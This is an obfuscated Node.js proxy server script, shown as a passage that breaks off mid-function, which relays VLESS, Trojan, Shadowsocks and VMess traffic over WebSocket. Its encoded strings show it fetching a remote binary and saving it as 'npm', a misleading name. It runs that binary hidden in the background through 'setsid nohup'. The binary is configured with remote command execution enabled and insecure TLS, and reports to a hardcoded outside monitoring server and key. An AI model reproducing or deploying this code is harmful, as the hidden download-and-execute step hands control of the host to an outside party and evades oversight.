const _0x2d3854=_0x4793;(function(_0x81eaea,_0x467023){const _0x33a1ad={_0x268d3d:0x1cd,_0x4e5d66:0x1fe,_0x2ce53f:0x190},_0xa860e3=_0x4793,_0x513548=_0x81eaea();while(!![]){try{const _0x593780=-parseInt(_0xa860e3(_0x33a1ad._0x268d3d))/0x1+-parseInt(_0xa860e3(0x1e3))/0x2*(-parseInt(_0xa860e3(0x1ed))/0x3)+parseInt(_0xa860e3(0x1a7))/0x4*(parseInt(_0xa860e3(_0x33a1ad._0x4e5d66))/0x5)+parseInt(_0xa860e3(0x188))/0x6*(-parseInt(_0xa860e3(0x1cb))/0x7)+parseInt(_0xa860e3(0x20b))/0x8+-parseInt(_0xa860e3(0x178))/0x9*(parseInt(_0xa860e3(0x162))/0xa)+parseInt(_0xa860e3(_0x33a1ad._0x2ce53f))/0xb;if(_0x593780===_0x467023)break;else _0x513548['push'](_0x513548['shift']());}catch(_0x132b20){_0x513548['push'](_0x513548['shift']());}}}(_0x3964,0x18ce8));function _0x4793(_0x564805,_0x250b68){const _0x396494=_0x3964();return _0x4793=function(_0x47939e,_0x227a33){_0x47939e=_0x47939e-0x162;let _0xe4cef9=_0x396494[_0x47939e];return _0xe4cef9;},_0x4793(_0x564805,_0x250b68);}const os=require('os'),http=require('http'),https=require(_0x2d3854(0x16f)),fs=require('fs'),net=require(_0x2d3854(0x1d1)),path=require(_0x2d3854(0x18f)),crypto=require(_0x2d3854(0x1c7)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),vmsServer=require(_0x2d3854(0x167)),Validator=require(_0x2d3854(0x1cc)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x2d3854(0x1bc)]['UUID']||_0x2d3854(0x193),NEZHA_SERVER=process[_0x2d3854(0x1bc)]['NEZHA_SERVER']||'nezha.qzz.io:8008',NEZHA_PORT=process[_0x2d3854(0x1bc)][_0x2d3854(0x1bf)]||'',NEZHA_KEY=process[_0x2d3854(0x1bc)][_0x2d3854(0x204)]||_0x2d3854(0x195),DOMAIN=process[_0x2d3854(0x1bc)][_0x2d3854(0x18b)]||'',AUTO_ACCESS=process[_0x2d3854(0x1bc)][_0x2d3854(0x1fa)]||![],WSPATH=process[_0x2d3854(0x1bc)][_0x2d3854(0x1aa)]||UUID[_0x2d3854(0x192)](0x0,0x8),SUB_PATH=process[_0x2d3854(0x1bc)][_0x2d3854(0x201)]||'nice',NAME=process['env'][_0x2d3854(0x1de)]||'',PORT=process['env']['PORT']||0xbb8;let uuid=UUID[_0x2d3854(0x163)](/-/g,''),CurrentDomain=DOMAIN,Tls=_0x2d3854(0x1f9),CurrentPort=0x1bb,ISP='';const vmsUser={'id':UUID,'alterId':0x0,'security':_0x2d3854(0x184)};Validator[_0x2d3854(0x1be)]({'tag':_0x2d3854(0x1f6),'users':[vmsUser]});const DNS_SERVERS=[_0x2d3854(0x1e6),_0x2d3854(0x1c9)],BLOCKED_DOMAINS=[_0x2d3854(0x183),_0x2d3854(0x1c4),_0x2d3854(0x1f4),_0x2d3854(0x186),'speedof.me',_0x2d3854(0x169),_0x2d3854(0x18e),_0x2d3854(0x1f5),_0x2d3854(0x1bb),_0x2d3854(0x165)];function isBlockedDomain(_0x1b2cc9){const _0x3d878a=_0x2d3854;if(!_0x1b2cc9)return![];const _0x5ef1ca=_0x1b2cc9[_0x3d878a(0x17e)]();return BLOCKED_DOMAINS['some'](_0x1f2e67=>{return _0x5ef1ca===_0x1f2e67||_0x5ef1ca['endsWith']('.'+_0x1f2e67);});}function _0x3964(){const _0x375074=['Request\x20timeout','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','https','data','npm\x20is\x20already\x20running,\x20skip\x20running...','2096','https://arm64.ssss.nyc.mn/v1','&path=%2F','Server',';path%3D%2F','https://oooo.serv00.net/add-url','9mOhiSZ','url',';skip-cert-verify%3Dtrue;mux%3D0#','Status','POST','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','toLowerCase','destroy','utf8','map','https://arm64.ssss.nyc.mn/agent','speedtest.net','auto','arch','speed.cloudflare.com','length','128568xwJHKm','&sni=','8443','DOMAIN','readUInt16BE','digest','bandwidth.place','path','1111803TAAoEw','stringify','slice','fbeca9d4-47ed-4e30-9f59-12392e294a98','status','nezha123@','false','request','\x20with\x20all\x20DNS\x20servers','test','text/plain','pop','writeHead','toString','npm\x20is\x20running','catch','join','?encryption=none&security=','from','https://dns.google/resolve?name=','setsid\x20nohup\x20./npm\x20-s\x20','config.yaml','concat','294928ejvtfY','?plugin=v2ray-plugin;mode%3Dwebsocket;host%3D','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','WSPATH','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','error','http://ip-api.com/json/?fields=status,country,countryCode,isp,as','includes','https://amd64.ssss.nyc.mn/v1','destroyed','startsWith','pipe','createServer','&type=A','https://','parse','_socket','Hello\x20world!','connect','443','librespeed.org','env','ISP','init','NEZHA_PORT','createHash','send','reduce','index.html','fast.com','readFile','true','crypto','https://amd64.ssss.nyc.mn/agent','1.1.1.1','your-domain.com','14xlCcgW','jsvms/protocols/vmess/validator','157693ShqbpJ','npm\x20download\x20successfully','sni%3D','Failed\x20to\x20resolve\x20','net','ss://','Failed\x20to\x20get\x20IP','then','none','isp','npm\x20running\x20error:','createWriteStream','vless://','decode','port','base64','client_secret:\x20','NAME','tls;','Not\x20Found\x0a','npm','write','482Bmxvkw','countryCode','--tls','8.8.4.4','aarch64','\x20-p\x20','finish','connection','arm','get','1473ORydWd','find','trim','log','message','forEach','type','speedtest.cn','speed.io','inbound','readUInt8','text/html','tls','AUTO_ACCESS','&fp=chrome&type=ws&host=','chrome','unlink','5DRSfma','readyState','chmod\x20+x\x20npm','SUB_PATH','every','2083','NEZHA_KEY','vmess://','2087','close','sha224','hex','https://api-ipv4.ip.sb/ip','760824ddJJms','860820JFMVqc','replace','writeFileSync','speedcheck.org','error:\x20','jsvms/protocols/vmess/server','none:','testmy.net','end','Answer','remoteAddress'];_0x3964=function(){return _0x375074;};return _0x3964();}const httpGet=(_0x223ec5,_0x13e3e4={})=>{const _0x101ca6={_0x2b78b5:0x16f},_0x10631c={_0x5ef1a1:0x17f};return new Promise((_0x2f2b40,_0x3692be)=>{const _0x4102fb={_0x493098:0x170},_0x560abf=_0x4793,_0x4cd157=_0x13e3e4['timeout']||0x2710,_0x370922=_0x223ec5[_0x560abf(0x1b1)](_0x560abf(_0x101ca6._0x2b78b5))?https:http,_0x2e5726=_0x370922[_0x560abf(0x1ec)](_0x223ec5,{'timeout':_0x4cd157},_0x48cef9=>{const _0x492148={_0x5578d0:0x1b6},_0x2d7d5f=_0x560abf;let _0x121732='';_0x48cef9['on'](_0x2d7d5f(_0x4102fb._0x493098),_0x5d0161=>_0x121732+=_0x5d0161),_0x48cef9['on'](_0x2d7d5f(0x16a),()=>{const _0xa27445=_0x2d7d5f;try{const _0x1746fa=JSON[_0xa27445(_0x492148._0x5578d0)](_0x121732);_0x2f2b40({'data':_0x1746fa});}catch(_0xfeab25){_0x2f2b40({'data':_0x121732});}});});_0x2e5726['on'](_0x560abf(0x1ac),_0x3692be),_0x2e5726['on']('timeout',()=>{const _0x447a4=_0x560abf;_0x2e5726[_0x447a4(_0x10631c._0x5ef1a1)](),_0x3692be(new Error(_0x447a4(0x16d)));});});},httpPost=(_0x553eeb,_0x2d2b89,_0xbda327={})=>{const _0x1fe6ac={_0x2b3dcc:0x191,_0x307c1b:0x1db,_0x262db8:0x197,_0x3791af:0x1ac,_0x26644a:0x1e2};return new Promise((_0x4a378d,_0x514561)=>{const _0x15f93c={_0x3a33f6:0x16a},_0x3ec100=_0x4793,_0x3e9c72=new URL(_0x553eeb),_0x5e4077=JSON[_0x3ec100(_0x1fe6ac._0x2b3dcc)](_0x2d2b89),_0x1c264a={'hostname':_0x3e9c72['hostname'],'port':_0x3e9c72[_0x3ec100(_0x1fe6ac._0x307c1b)]||0x1bb,'path':_0x3e9c72['pathname'],'method':_0x3ec100(0x17c),'headers':{'Content-Type':'application/json','Content-Length':_0x5e4077[_0x3ec100(0x187)],..._0xbda327['headers']}},_0x122ea3=https[_0x3ec100(_0x1fe6ac._0x262db8)](_0x1c264a,_0x224954=>{const _0x91f56c=_0x3ec100;let _0x3a42ef='';_0x224954['on']('data',_0x2d0012=>_0x3a42ef+=_0x2d0012),_0x224954['on'](_0x91f56c(_0x15f93c._0x3a33f6),()=>_0x4a378d({'data':_0x3a42ef}));});_0x122ea3['on'](_0x3ec100(_0x1fe6ac._0x3791af),_0x514561),_0x122ea3[_0x3ec100(_0x1fe6ac._0x26644a)](_0x5e4077),_0x122ea3[_0x3ec100(0x16a)]();});},GetConfig=async()=>{const _0x115b16={_0x144252:0x194,_0x207b57:0x1d6,_0x28eee8:0x1e4,_0x147ffa:0x1ca,_0x5202eb:0x20a,_0x212465:0x170,_0x5e0100:0x1d5,_0x1ab36d:0x1ac,_0x438eea:0x1f9},_0x49cb6f=_0x2d3854;try{const _0x2e7ecf=await httpGet(_0x49cb6f(0x1ad),{'timeout':0x1f40}),_0x4af6ae=_0x2e7ecf['data'];if(_0x4af6ae&&_0x4af6ae[_0x49cb6f(_0x115b16._0x144252)]==='success'&&_0x4af6ae[_0x49cb6f(0x1e4)]){const _0x353ef3=_0x4af6ae[_0x49cb6f(_0x115b16._0x207b57)]||_0x4af6ae['as']||_0x49cb6f(0x1bd);ISP=(_0x4af6ae[_0x49cb6f(_0x115b16._0x28eee8)]+'-'+_0x353ef3)[_0x49cb6f(0x163)](/ /g,'_');}else ISP='Unknown';}catch(_0x5b048b){ISP='Unknown';}if(!DOMAIN||DOMAIN===_0x49cb6f(_0x115b16._0x147ffa))try{const _0x198f52=await httpGet(_0x49cb6f(_0x115b16._0x5202eb),{'timeout':0x1f40}),_0x15fee4=_0x198f52[_0x49cb6f(_0x115b16._0x212465)][_0x49cb6f(0x1ef)]();CurrentDomain=_0x15fee4,Tls=_0x49cb6f(_0x115b16._0x5e0100),CurrentPort=PORT;}catch(_0x4f6a38){console[_0x49cb6f(_0x115b16._0x1ab36d)](_0x49cb6f(0x1d3),_0x4f6a38[_0x49cb6f(0x1f1)]),(CurrentDomain=_0x49cb6f(0x1ca),Tls=_0x49cb6f(0x1f9),CurrentPort=0x1bb);}else CurrentDomain=DOMAIN,Tls=_0x49cb6f(_0x115b16._0x438eea),CurrentPort=0x1bb;},httpServer=http[_0x2d3854(0x1b3)]((_0xba8eea,_0x4cbef4)=>{const _0x2b96d2={_0x6fa9:0x180,_0x3c12c6:0x179,_0x6b6814:0x19c,_0x4dd557:0x16a},_0x2fa077={_0x4088e6:0x1df,_0x50e314:0x168,_0x4bea70:0x19d,_0x37a835:0x1dc,_0x39bcd9:0x1d9,_0x5e2308:0x1a1,_0x16dc61:0x189,_0x5e6f05:0x1a8,_0x1a9ce9:0x176,_0x3c7e8c:0x1cf,_0x481a7c:0x17a,_0x399d29:0x1dc,_0x220f70:0x1dc,_0x5cfc66:0x19c,_0x31a2f3:0x19a},_0x47693d={_0x3bbdbf:0x1b8,_0x59b973:0x19c,_0x407582:0x1f8},_0x463c60=_0x2d3854;if(_0xba8eea[_0x463c60(0x179)]==='/'){const _0x232038=path[_0x463c60(0x1a0)](__dirname,_0x463c60(0x1c3));fs[_0x463c60(0x1c5)](_0x232038,_0x463c60(_0x2b96d2._0x6fa9),(_0xfe3ebe,_0x35fc50)=>{const _0x2cabaa=_0x463c60;if(_0xfe3ebe){_0x4cbef4['writeHead'](0xc8,{'Content-Type':_0x2cabaa(0x1f8)}),_0x4cbef4[_0x2cabaa(0x16a)](_0x2cabaa(_0x47693d._0x3bbdbf));return;}_0x4cbef4[_0x2cabaa(_0x47693d._0x59b973)](0xc8,{'Content-Type':_0x2cabaa(_0x47693d._0x407582)}),_0x4cbef4[_0x2cabaa(0x16a)](_0x35fc50);});return;}else _0xba8eea[_0x463c60(_0x2b96d2._0x3c12c6)]==='/'+SUB_PATH?GetConfig()[_0x463c60(0x1d4)](()=>{const _0xf3993f=_0x463c60,_0x38a955=NAME?NAME+'-'+ISP:ISP,_0x4fe65e=Tls===_0xf3993f(0x1f9)?_0xf3993f(0x1f9):'none',_0x1b0783=Tls===_0xf3993f(0x1f9)?_0xf3993f(_0x2fa077._0x4088e6):'',_0x2d3248=Buffer[_0xf3993f(0x1a2)](_0xf3993f(_0x2fa077._0x50e314)+UUID)[_0xf3993f(_0x2fa077._0x4bea70)](_0xf3993f(_0x2fa077._0x37a835)),_0xf16841=_0xf3993f(_0x2fa077._0x39bcd9)+UUID+'@'+CurrentDomain+':'+CurrentPort+_0xf3993f(_0x2fa077._0x5e2308)+_0x4fe65e+_0xf3993f(_0x2fa077._0x16dc61)+CurrentDomain+'&fp=chrome&type=ws&host='+CurrentDomain+_0xf3993f(0x174)+WSPATH+'#'+_0x38a955,_0xaa4a3c='trojan://'+UUID+'@'+CurrentDomain+':'+CurrentPort+'?security='+_0x4fe65e+_0xf3993f(_0x2fa077._0x16dc61)+CurrentDomain+_0xf3993f(0x1fb)+CurrentDomain+_0xf3993f(0x174)+WSPATH+'#'+_0x38a955,_0x85308f=_0xf3993f(0x1d2)+_0x2d3248+'@'+CurrentDomain+':'+CurrentPort+_0xf3993f(_0x2fa077._0x5e6f05)+CurrentDomain+_0xf3993f(_0x2fa077._0x1a9ce9)+WSPATH+';'+_0x1b0783+_0xf3993f(_0x2fa077._0x3c7e8c)+CurrentDomain+_0xf3993f(_0x2fa077._0x481a7c)+_0x38a955,_0x5d32b1={'v':'2','ps':''+_0x38a955,'add':CurrentDomain,'port':CurrentPort['toString'](),'id':UUID,'aid':'0','scy':_0xf3993f(0x184),'net':'ws','type':'none','host':CurrentDomain,'path':'/'+WSPATH,'tls':Tls,'sni':CurrentDomain,'alpn':'','allowInsecure':'0','fp':_0xf3993f(0x1fc)},_0x5db243=_0xf3993f(0x205)+Buffer['from'](JSON[_0xf3993f(0x191)](_0x5d32b1))[_0xf3993f(0x19d)](_0xf3993f(_0x2fa077._0x399d29)),_0x28a8bd=_0xf16841+'\x0a'+_0x5db243+'\x0a'+_0xaa4a3c+'\x0a'+_0x85308f,_0x10cabe=Buffer['from'](_0x28a8bd)[_0xf3993f(_0x2fa077._0x4bea70)](_0xf3993f(_0x2fa077._0x220f70));_0x4cbef4[_0xf3993f(_0x2fa077._0x5cfc66)](0xc8,{'Content-Type':_0xf3993f(_0x2fa077._0x31a2f3)}),_0x4cbef4['end'](_0x10cabe+'\x0a');}):(_0x4cbef4[_0x463c60(_0x2b96d2._0x6b6814)](0x194,{'Content-Type':'text/plain'}),_0x4cbef4[_0x463c60(_0x2b96d2._0x4dd557)](_0x463c60(0x1e0)));});function resolveHost(_0x50f005){const _0x3c4aba={_0x2e8d88:0x199},_0x211c4f={_0x4e06d1:0x1d0,_0x1791c1:0x1a3,_0x1936f4:0x1b4};return new Promise((_0x37fd9c,_0xacab1a)=>{const _0x28e6fb=_0x4793;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x28e6fb(_0x3c4aba._0x2e8d88)](_0x50f005)){_0x37fd9c(_0x50f005);return;}let _0x41d2ad=0x0;function _0x4a2a1d(){const _0x28c545={_0x594b03:0x17b,_0x2e66d4:0x1ee},_0x4c0f2f=_0x28e6fb;if(_0x41d2ad>=DNS_SERVERS['length']){_0xacab1a(new Error(_0x4c0f2f(_0x211c4f._0x4e06d1)+_0x50f005+_0x4c0f2f(0x198)));return;}const _0x193521=DNS_SERVERS[_0x41d2ad];_0x41d2ad++;const _0x4c8f68=_0x4c0f2f(_0x211c4f._0x1791c1)+encodeURIComponent(_0x50f005)+_0x4c0f2f(_0x211c4f._0x1936f4);httpGet(_0x4c8f68,{'timeout':0x1388})[_0x4c0f2f(0x1d4)](_0xa78df4=>{const _0x2117f0=_0x4c0f2f,_0x572768=_0xa78df4[_0x2117f0(0x170)];if(_0x572768[_0x2117f0(_0x28c545._0x594b03)]===0x0&&_0x572768[_0x2117f0(0x16b)]&&_0x572768[_0x2117f0(0x16b)][_0x2117f0(0x187)]>0x0){const _0x3e173f=_0x572768['Answer'][_0x2117f0(_0x28c545._0x2e66d4)](_0x514216=>_0x514216[_0x2117f0(0x1f3)]===0x1);if(_0x3e173f){_0x37fd9c(_0x3e173f['data']);return;}}_0x4a2a1d();})[_0x4c0f2f(0x19f)](_0x403c15=>{_0x4a2a1d();});}_0x4a2a1d();});}function handleVlsConnection(_0x20e4a9,_0x292249){const _0x2ea69e={_0x2f5b19:0x18c,_0xfae535:0x192,_0x39952b:0x1f7,_0xecbd74:0x1f7,_0x30e136:0x1c2,_0x124607:0x207,_0xe5b2f0:0x19f},_0xab3031={_0x238d72:0x1ac},_0x50dc4a={_0x52e186:0x1e2,_0xff812:0x1ac,_0x53823a:0x1b2},_0x31332a=_0x2d3854,[_0x3732a1]=_0x292249,_0x59d36e=_0x292249['slice'](0x1,0x11);if(!_0x59d36e[_0x31332a(0x202)]((_0x3d2e99,_0xda22ac)=>_0x3d2e99==parseInt(uuid['substr'](_0xda22ac*0x2,0x2),0x10)))return![];let _0x1cce92=_0x292249['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x53ad11=_0x292249['slice'](_0x1cce92,_0x1cce92+=0x2)[_0x31332a(_0x2ea69e._0x2f5b19)](0x0),_0x33ab18=_0x292249[_0x31332a(_0x2ea69e._0xfae535)](_0x1cce92,_0x1cce92+=0x1)[_0x31332a(_0x2ea69e._0x39952b)](),_0x101b2c=_0x33ab18==0x1?_0x292249['slice'](_0x1cce92,_0x1cce92+=0x4)['join']('.'):_0x33ab18==0x2?new TextDecoder()[_0x31332a(0x1da)](_0x292249[_0x31332a(0x192)](_0x1cce92+0x1,_0x1cce92+=0x1+_0x292249['slice'](_0x1cce92,_0x1cce92+0x1)[_0x31332a(_0x2ea69e._0xecbd74)]())):_0x33ab18==0x3?_0x292249['slice'](_0x1cce92,_0x1cce92+=0x10)[_0x31332a(_0x2ea69e._0x30e136)]((_0x352e58,_0x531264,_0x1df617,_0x1f00c7)=>_0x1df617%0x2?_0x352e58[_0x31332a(0x1a6)](_0x1f00c7['slice'](_0x1df617-0x1,_0x1df617+0x1)):_0x352e58,[])['map'](_0x22f4c4=>_0x22f4c4[_0x31332a(0x18c)](0x0)[_0x31332a(0x19d)](0x10))[_0x31332a(0x1a0)](':'):'';if(isBlockedDomain(_0x101b2c))return _0x20e4a9[_0x31332a(_0x2ea69e._0x124607)](),![];_0x20e4a9['send'](new Uint8Array([_0x3732a1,0x0]));const _0x3ee256=createWebSocketStream(_0x20e4a9);return resolveHost(_0x101b2c)[_0x31332a(0x1d4)](_0xd9937a=>{const _0xd9c1c9=_0x31332a;net['connect']({'host':_0xd9937a,'port':_0x53ad11},function(){const _0x549437=_0x4793;this[_0x549437(_0x50dc4a._0x52e186)](_0x292249['slice'](_0x1cce92)),_0x3ee256['on'](_0x549437(_0x50dc4a._0xff812),()=>{})[_0x549437(0x1b2)](this)['on'](_0x549437(_0x50dc4a._0xff812),()=>{})[_0x549437(_0x50dc4a._0x53823a)](_0x3ee256);})['on'](_0xd9c1c9(_0xab3031._0x238d72),()=>{});})[_0x31332a(_0x2ea69e._0xe5b2f0)](_0x37af36=>{const _0x3a9886={_0x297bb2:0x1e2,_0x442c3b:0x1ac,_0x2fb01f:0x1b2};net['connect']({'host':_0x101b2c,'port':_0x53ad11},function(){const _0x3a9033=_0x4793;this[_0x3a9033(_0x3a9886._0x297bb2)](_0x292249['slice'](_0x1cce92)),_0x3ee256['on']('error',()=>{})['pipe'](this)['on'](_0x3a9033(_0x3a9886._0x442c3b),()=>{})[_0x3a9033(_0x3a9886._0x2fb01f)](_0x3ee256);})['on']('error',()=>{});}),!![];}function handleTrojConnection(_0x23a9ed,_0x188248){const _0x2232b1={_0x1669c5:0x187,_0x3cc9ee:0x1c0,_0x1f9062:0x208,_0x42ff48:0x209,_0x54b76e:0x19d,_0x4e8374:0x181,_0x41d0d9:0x18c,_0x1df05f:0x1d4},_0xbc5fb3={_0x3a1d44:0x1b9},_0x3028ea={_0x12bbf2:0x187,_0x136e41:0x1e2,_0x53b0dd:0x1ac,_0x698a3:0x1b2,_0xf0b37f:0x1b2},_0x551ca2=_0x2d3854;try{if(_0x188248[_0x551ca2(_0x2232b1._0x1669c5)]<0x3a)return![];const _0x1a2515=_0x188248['slice'](0x0,0x38)[_0x551ca2(0x19d)](),_0x115b47=[UUID];let _0xcc6734=null;for(const _0x4c18cf of _0x115b47){const _0x30e93c=crypto[_0x551ca2(_0x2232b1._0x3cc9ee)](_0x551ca2(_0x2232b1._0x1f9062))['update'](_0x4c18cf)[_0x551ca2(0x18d)](_0x551ca2(_0x2232b1._0x42ff48));if(_0x30e93c===_0x1a2515){_0xcc6734=_0x4c18cf;break;}}if(!_0xcc6734)return![];let _0x62e09a=0x38;_0x188248[_0x62e09a]===0xd&&_0x188248[_0x62e09a+0x1]===0xa&&(_0x62e09a+=0x2);const _0x4a8540=_0x188248[_0x62e09a];if(_0x4a8540!==0x1)return![];_0x62e09a+=0x1;const _0x4160fe=_0x188248[_0x62e09a];_0x62e09a+=0x1;let _0x25c461,_0x44321a;if(_0x4160fe===0x1)_0x25c461=_0x188248[_0x551ca2(0x192)](_0x62e09a,_0x62e09a+0x4)[_0x551ca2(0x1a0)]('.'),_0x62e09a+=0x4;else{if(_0x4160fe===0x3){const _0xcb3eb6=_0x188248[_0x62e09a];_0x62e09a+=0x1,_0x25c461=_0x188248['slice'](_0x62e09a,_0x62e09a+_0xcb3eb6)[_0x551ca2(_0x2232b1._0x54b76e)](),_0x62e09a+=_0xcb3eb6;}else{if(_0x4160fe===0x4)_0x25c461=_0x188248[_0x551ca2(0x192)](_0x62e09a,_0x62e09a+0x10)['reduce']((_0x20fb64,_0x49ea68,_0x56af44,_0x51a360)=>_0x56af44%0x2?_0x20fb64[_0x551ca2(0x1a6)](_0x51a360[_0x551ca2(0x192)](_0x56af44-0x1,_0x56af44+0x1)):_0x20fb64,[])[_0x551ca2(_0x2232b1._0x4e8374)](_0x35d63c=>_0x35d63c[_0x551ca2(0x18c)](0x0)[_0x551ca2(0x19d)](0x10))[_0x551ca2(0x1a0)](':'),_0x62e09a+=0x10;else return![];}}_0x44321a=_0x188248[_0x551ca2(_0x2232b1._0x41d0d9)](_0x62e09a),_0x62e09a+=0x2;_0x62e09a<_0x188248['length']&&_0x188248[_0x62e09a]===0xd&&_0x188248[_0x62e09a+0x1]===0xa&&(_0x62e09a+=0x2);if(isBlockedDomain(_0x25c461))return _0x23a9ed['close'](),![];const _0x36374b=createWebSocketStream(_0x23a9ed);return resolveHost(_0x25c461)[_0x551ca2(_0x2232b1._0x1df05f)](_0x5bf52f=>{const _0x1c9b43={_0x250409:0x187,_0x51acd0:0x192,_0x1d7cba:0x1ac,_0x2e701a:0x1b2},_0x4eca7d=_0x551ca2;net[_0x4eca7d(0x1b9)]({'host':_0x5bf52f,'port':_0x44321a},function(){const _0x163ed1=_0x4eca7d;_0x62e09a<_0x188248[_0x163ed1(_0x1c9b43._0x250409)]&&this[_0x163ed1(0x1e2)](_0x188248[_0x163ed1(_0x1c9b43._0x51acd0)](_0x62e09a)),_0x36374b['on'](_0x163ed1(_0x1c9b43._0x1d7cba),()=>{})[_0x163ed1(_0x1c9b43._0x2e701a)](this)['on']('error',()=>{})['pipe'](_0x36374b);})['on'](_0x4eca7d(0x1ac),()=>{});})[_0x551ca2(0x19f)](_0x4a00dd=>{const _0x2a0f9a=_0x551ca2;net[_0x2a0f9a(_0xbc5fb3._0x3a1d44)]({'host':_0x25c461,'port':_0x44321a},function(){const _0x20ecac=_0x2a0f9a;_0x62e09a<_0x188248[_0x20ecac(_0x3028ea._0x12bbf2)]&&this[_0x20ecac(_0x3028ea._0x136e41)](_0x188248[_0x20ecac(0x192)](_0x62e09a)),_0x36374b['on'](_0x20ecac(_0x3028ea._0x53b0dd),()=>{})[_0x20ecac(_0x3028ea._0x698a3)](this)['on'](_0x20ecac(0x1ac),()=>{})[_0x20ecac(_0x3028ea._0xf0b37f)](_0x36374b);})['on']('error',()=>{});}),!![];}catch(_0x168340){return![];}}function handleSsConnection(_0x2d194f,_0x147451){const _0x55fd1f={_0x16d6e4:0x192,_0x43ccde:0x1a0,_0x8fe1:0x19d,_0x207398:0x1c2,_0x2d6084:0x181,_0x57486d:0x18c,_0x5da816:0x1d4},_0x49a0d7={_0x79697a:0x1b9},_0x3489be={_0x592f68:0x1e2,_0x4caab3:0x1ac,_0x15b0d2:0x1b2},_0x228da2=_0x2d3854;try{let _0x8da683=0x0;const _0x2a0365=_0x147451[_0x8da683];_0x8da683+=0x1;let _0x5d75bb,_0x4c5345;if(_0x2a0365===0x1)_0x5d75bb=_0x147451[_0x228da2(_0x55fd1f._0x16d6e4)](_0x8da683,_0x8da683+0x4)[_0x228da2(_0x55fd1f._0x43ccde)]('.'),_0x8da683+=0x4;else{if(_0x2a0365===0x3){const _0x28cab1=_0x147451[_0x8da683];_0x8da683+=0x1,_0x5d75bb=_0x147451['slice'](_0x8da683,_0x8da683+_0x28cab1)[_0x228da2(_0x55fd1f._0x8fe1)](),_0x8da683+=_0x28cab1;}else{if(_0x2a0365===0x4)_0x5d75bb=_0x147451['slice'](_0x8da683,_0x8da683+0x10)[_0x228da2(_0x55fd1f._0x207398)]((_0x389466,_0x2c0222,_0x4f6085,_0x772ef2)=>_0x4f6085%0x2?_0x389466[_0x228da2(0x1a6)](_0x772ef2[_0x228da2(0x192)](_0x4f6085-0x1,_0x4f6085+0x1)):_0x389466,[])[_0x228da2(_0x55fd1f._0x2d6084)](_0x556a35=>_0x556a35[_0x228da2(0x18c)](0x0)[_0x228da2(0x19d)](0x10))['join'](':'),_0x8da683+=0x10;else return![];}}_0x4c5345=_0x147451[_0x228da2(_0x55fd1f._0x57486d)](_0x8da683),_0x8da683+=0x2;if(isBlockedDomain(_0x5d75bb))return _0x2d194f['close'](),![];const _0x313dbe=createWebSocketStream(_0x2d194f);return resolveHost(_0x5d75bb)[_0x228da2(_0x55fd1f._0x5da816)](_0x408e60=>{net['connect']({'host':_0x408e60,'port':_0x4c5345},function(){const _0x34139a=_0x4793;_0x8da683<_0x147451[_0x34139a(0x187)]&&this[_0x34139a(_0x3489be._0x592f68)](_0x147451[_0x34139a(0x192)](_0x8da683)),_0x313dbe['on']('error',()=>{})[_0x34139a(0x1b2)](this)['on'](_0x34139a(_0x3489be._0x4caab3),()=>{})[_0x34139a(_0x3489be._0x15b0d2)](_0x313dbe);})['on']('error',()=>{});})['catch'](_0x7ba0cd=>{const _0x1d6b62={_0x2534c9:0x1e2,_0x45d12b:0x1b2},_0x491f63=_0x228da2;net[_0x491f63(_0x49a0d7._0x79697a)]({'host':_0x5d75bb,'port':_0x4c5345},function(){const _0x569fc4=_0x491f63;_0x8da683<_0x147451[_0x569fc4(0x187)]&&this[_0x569fc4(_0x1d6b62._0x2534c9)](_0x147451[_0x569fc4(0x192)](_0x8da683)),_0x313dbe['on'](_0x569fc4(0x1ac),()=>{})[_0x569fc4(_0x1d6b62._0x45d12b)](this)['on'](_0x569fc4(0x1ac),()=>{})['pipe'](_0x313dbe);})['on'](_0x491f63(0x1ac),()=>{});}),!![];}catch(_0x716f25){return![];}}function handleVmsConnection(_0xaae174,_0x35788c){const _0x3c63c5={_0x4c98c7:0x1b7,_0x4542f3:0x1f6,_0x28d15a:0x16c,_0x52379e:0x1f1,_0x4eadae:0x1f1},_0x6cb248={_0x9db751:0x19f},_0x2468c2={_0x555182:0x1b0,_0x10f413:0x1e2},_0x5b2c84={_0x331767:0x170,_0x1ade50:0x207,_0x43d11c:0x1ac},_0x35efb3={_0x550388:0x1c1},_0x480e60=_0x2d3854;try{if(_0x35788c['length']<0x1a)return![];const _0x4e880d={'localClose':()=>{const _0x4a1751=_0x4793;_0xaae174[_0x4a1751(0x207)]();},'localMessage':_0x443f1e=>{const _0x362cd2=_0x4793;if(_0xaae174[_0x362cd2(0x1ff)]===WebSocket['OPEN'])_0xaae174[_0x362cd2(_0x35efb3._0x550388)](_0x443f1e);},'remoteAddress':_0xaae174[_0x480e60(_0x3c63c5._0x4c98c7)]['remoteAddress'],'remotePort':_0xaae174[_0x480e60(_0x3c63c5._0x4c98c7)]['remotePort'],'app':{}},_0x94f398=(_0x15cad5,_0x2a467d,_0x321ea5,_0x418203,_0x5d339f,_0x2d73ce)=>{const _0x7e13b6={_0x2a3f64:0x17f},_0x567542=_0x480e60;if(isBlockedDomain(_0x15cad5))return _0x2d73ce(),{'message':()=>{},'close':()=>{}};let _0x5546b9=null;return resolveHost(_0x15cad5)['then'](_0x4ed761=>{const _0x468b69=_0x4793;_0x5546b9=net['connect']({'host':_0x4ed761,'port':_0x2a467d},()=>{_0x418203();}),_0x5546b9['on'](_0x468b69(_0x5b2c84._0x331767),_0x5d339f),_0x5546b9['on'](_0x468b69(_0x5b2c84._0x1ade50),_0x2d73ce),_0x5546b9['on'](_0x468b69(_0x5b2c84._0x43d11c),_0x2d73ce);})[_0x567542(_0x6cb248._0x9db751)](_0x2d73ce),{'message':_0x45aec8=>{const 